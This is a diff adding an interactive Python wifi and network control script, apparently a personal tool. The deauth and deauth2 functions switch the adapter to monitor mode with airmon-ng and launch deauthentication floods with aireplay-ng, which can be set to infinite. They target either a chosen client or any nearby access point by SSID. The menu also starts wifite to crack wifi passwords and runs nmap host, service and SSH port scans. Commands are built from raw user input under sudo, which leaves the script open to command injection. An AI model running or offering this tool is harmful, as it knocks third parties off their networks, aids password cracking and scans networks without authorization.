@@ -1,0 +1,175 @@
+#!/usr/bin/python3
+#version 1.5
+import os
+import subprocess
+from termcolor import colored, cprint
+
+def greeting():
+	cprint('Start wifi/network control script', 'green', attrs=['bold'])
+	cprint('commands:', 'blue', attrs=['bold'])
+	cprint('wifi: view wifi connections and signal strength', 'blue', attrs=['bold'])
+	cprint('wifi2: wavemon detailed wifi monitor', 'blue', attrs=['bold'])
+	cprint('crack: start wifite and get wifi pswd- NOT SETUP', 'blue', attrs=['bold'])
+	cprint('manage: change wifi chip to managed', 'blue', attrs=['bold'])
+	cprint('deauth: deauth on active wifi network ', 'blue', attrs=['bold'])
+	cprint('deauth2: deauth on another wifi network ', 'blue', attrs=['bold'])
+	cprint('manager: network manager config ', 'blue', attrs=['bold'])
+	cprint('scan: scan network (nmap)', 'blue', attrs=['bold'])
+	cprint('deepScan', 'blue', attrs=['bold'])
+	cprint('sshscan: scan port 22', 'blue', attrs=['bold'])
+	cprint('monitor: iftop','blue',attrs=['bold'])
+	cprint('ws: wireshark','blue',attrs=['bold'])
+	cprint('9: edit wifi/network connections','blue', attrs=['bold'])
+	cprint('0: exit script', 'blue', attrs=['bold'])
+#--------------------------------------
+def manage():
+	cprint('restoring wifi to managed mode', 'green', attrs=['bold'])
+	p1=subprocess.run('sudo iwconfig', shell=True, stdout=subprocess.PIPE)
+	wifi = (p1.stdout.split()[0].decode('utf-8')) #output from iwconfig. search in here for wifi device name
+	os.system('sudo ifconfig '+wifi+ ' down')
+	print(wifi+' down')
+	os.system('sudo ip link set '+wifi+' name wlp2s0')
+	print('rename wifi device to wlp2s0')
+	os.system('sudo iwconfig wlp2s0 mode managed')
+	print('wlp2s0 managed mode')
+	os.system('sudo ifconfig wlp2s0 up')
+	print('wlp2s0 up')
+	os.system('sudo service network-manager restart')
+	print('wifi network-manager restart')
+	cprint('restored wifi to managed mode', 'green', attrs=['bold'])
+#--------------------------------------
+def deauth():
+	cprint('start deauth process', 'green', attrs=['bold'])
+	y = input('specific or general deauth:\n1 for specific or input 0\n')
+	p1=subprocess.run('sudo iwconfig', shell=True, stdout=subprocess.PIPE)
+	wifi = (p1.stdout.split()[0].decode('utf-8')) #wifi device name
+	print('wifi device name: '+wifi)
+	p1=subprocess.run('sudo ip route | grep default', shell=True, stdout=subprocess.PIPE)
+	ip = p1.stdout.split()[2].decode('utf-8') #router ip address
+	print('router ip address: '+ip)
+	p1=subprocess.run(('sudo iwconfig | grep -i Point'), shell=True, stdout=subprocess.PIPE)
+	router = p1.stdout.decode('utf-8').strip().split()[5] #[2].decode('utf-8') #router ip address
+	print('router mac address: '+router)
+	p1=subprocess.run('sudo iwlist '+wifi+' frequency | grep -i Frequency', shell=True, stdout=subprocess.PIPE)
+	chan = p1.stdout.split()[4].decode('utf-8')[:2] #router freq
+	print('router channel: '+chan)
+	if int(y) == 1:
+		os.system('sudo nmap -sP '+ ip[:10]+'*')
+		mac = input('\ninput mac address then press enter: ')
+	os.system('sudo airmon-ng start '+wifi) #start mon
+	os.system('sudo airmon-ng check kill') #kill wifi processes
+	os.system('sudo airmon-ng stop '+wifi+'mon') #stop mon
+	os.system('sudo airmon-ng start '+wifi+' '+chan)
+	p1=subprocess.run('sudo iwconfig', shell=True, stdout=subprocess.PIPE)
+	wifi = (p1.stdout.split()[0].decode('utf-8')) #wifi device name
+	print('new wifi device name: '+wifi)
+	z = input('number of deauth attacks:\n0 for infinite\n')
+	if int(y) == 1:
+		com = 'sudo aireplay-ng -0 '+z+' -a '+router+' -c '+mac+' '+wifi
+		print(com)
+		os.system(com)
+	else:
+		os.system('sudo aireplay-ng -0 '+z+' -a '+router+' '+wifi)
+	print('deauth finished')
+#--------------------------------------
+def deauth2():
+	cprint('start deauth process for another network', 'green', attrs=['bold'])
+	print('general deauth')
+	p1=subprocess.run('sudo iwconfig', shell=True, stdout=subprocess.PIPE)
+	wifi = (p1.stdout.split()[0].decode('utf-8')) #wifi device name
+	print('wifi device name: '+wifi+'\n')
+	os.system('sudo nmcli dev wifi')
+	print('  input ssid ')
+	router = input('which AP to deauth: ')
+	print('deauth AP: '+router)
+	p1=subprocess.run(('nmcli dev wifi | grep -i '+router), shell=True, stdout=subprocess.PIPE)
+	chan = p1.stdout.split()[2].decode('utf-8') #router freq
+	#chan = '11'
+	print('deauth channel: '+chan)
+	os.system('sudo airmon-ng start '+wifi) #start mon
+	os.system('sudo airmon-ng check kill') #kill wifi processes
+	os.system('sudo airmon-ng stop '+wifi+'mon') #stop mon
+	os.system('sudo airmon-ng start '+wifi+' '+chan)
+	p1=subprocess.run('sudo iwconfig', shell=True, stdout=subprocess.PIPE)
+	wifi = (p1.stdout.split()[0].decode('utf-8')) #wifi device name
+	print('new wifi device name: '+wifi)
+	z = input('number of deauth attacks:\n0 for infinite\n')
+	os.system('sudo aireplay-ng -0 '+z+' -e '+router+' '+wifi) #for bssid
+	#os.system('sudo aireplay-ng -0 '+z+' -a '+router+' '+wifi) #for mac
+	print('deauth finished')
+#--------------------------------------
+def loop():
+	userinput = ''
+	while userinput != '0':
+		x=0 #for error handling below
+		userinput = input('input command: ')
+
+		if userinput == 'wifi':
+			x=1
+			os.system('sudo nmcli dev wifi')
+			#os.system('sudo watch -n2 nmcli dev wifi')
+
+		if userinput == 'wifi2':
+			x=1
+			os.system('sudo wavemon')
+
+		if userinput == 'crack':
+			x=1
+			os.system('sudo wifite')
+		if userinput == 'ws':
+			x=1
+			os.system('sudo wireshark')
+		if userinput == 'manage':
+			x=1
+			manage()
+
+		if userinput == 'deauth':
+			x=1
+			deauth()
+			manage()
+
+		if userinput == 'deauth2':
+			x=1
+			deauth2()
+			manage()
+
+		if userinput == 'manager':
+			print('start network manager config:')
+			os.system('sudo NetworkManager --help')
+			x=1
+
+		if userinput == 'scan':
+			print('start nmap scan:')
+			ip = input('which IP range do you want to scan: ')
+			os.system('nmap -v '+ip)
+			x=1
+		if userinput == 'deepScan':
+			ip = input('which IP do you want to scan: ')
+			#os.system('nmap -Pn '+ip)
+			os.system('nmap -p- -sV -v '+ip)
+			x=1
+		if userinput == 'sshscan':
+			print('scanning for port 22')
+			ip = input('range of IP: ')
+			os.system('sudo nmap '+ip+' -p 22')
+			x=1
+		if userinput == 'monitor':
+			os.system('sudo iftop -i wlp2s0')
+			x=1
+		if userinput == '9':
+			print('start network editor')
+			os.system('nm-connection-editor')
+			x=1
+		if userinput == '0':
+			x=1
+			cprint('Exiting loop', 'red', attrs=['bold'])
+
+		if x== 0:
+			print(userinput, ': not a registered command')
+#--------------------------------------
+def main(): #main function
+	greeting()
+	loop()
+#start of script
+main()
+cprint('End of script', 'green', attrs=['bold'])
